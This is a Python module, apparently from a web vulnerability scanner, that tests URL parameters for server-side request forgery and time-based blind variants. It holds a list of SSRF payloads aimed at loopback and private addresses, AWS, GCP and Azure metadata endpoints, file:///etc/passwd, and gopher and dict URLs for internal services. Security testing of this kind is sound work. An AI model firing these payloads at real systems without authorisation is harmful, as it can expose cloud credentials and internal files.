"""SSRF (Server-Side Request Forgery) Detection Module"""

class SSRFTester:
    def __init__(self):
        self.name = "SSRF Tester"
    
    def test_ssrf(self, url):
        """Test for SSRF vulnerabilities"""
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # SSRF payloads
        payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/instance',  # Azure
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'file:///etc/passwd',
            'gopher://127.0.0.1:25/',
            'dict://127.0.0.1:11211/'
        ]
        
        url_params = ['url', 'uri', 'path', 'dest', 'redirect', 'link', 'src', 'source']
        
        for param in url_params:
            if param in params or '?' in url:
                for payload in payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
                    
                    try:
                        response = requests.get(test_url, timeout=10)
                        
                        # Check for internal IP responses
                        if '127.0.0.1' in response.text or 'localhost' in response.text:
                            vulnerabilities.append({
                                'type': 'SSRF - Internal IP Access',
                                'severity': 'CRITICAL',
                                'description': f'Parameter {param} allows internal IP access',
                                'evidence': f'Payload: {payload}',
                                'url': test_url
                            })
                            break
                        
                        # Check for cloud metadata
                        if 'ami-id' in response.text or 'instance-id' in response.text:
                            vulnerabilities.append({
                                'type': 'SSRF - Cloud Metadata Access',
                                'severity': 'CRITICAL',
                                'description': f'Parameter {param} exposes cloud metadata',
                                'evidence': 'AWS/GCP/Azure metadata accessible',
                                'url': test_url
                            })
                            break
                    
                    except Exception:
                        pass
        
        return vulnerabilities
    
    def test_blind_ssrf(self, url):
        """Test for blind SSRF (time-based)"""
        import requests
        import time
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Time-based SSRF payload (slow internal service)
        payload = 'http://192.168.1.1:81'  # Likely closed port
        
        url_params = ['url', 'uri', 'path']
        
        for param in url_params:
            if param in params:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
                
                try:
                    start = time.time()
                    requests.get(test_url, timeout=15)
                    elapsed = time.time() - start
                    
                    if elapsed > 5:
                        vulnerabilities.append({
                            'type': 'Blind SSRF (Time-based)',
                            'severity': 'HIGH',
                            'description': f'Parameter {param} may allow SSRF (slow response)',
                            'evidence': f'Response time: {elapsed:.2f}s',
                            'url': test_url
                        })
                        break
                
                except Exception:
                    pass
        
        return vulnerabilities
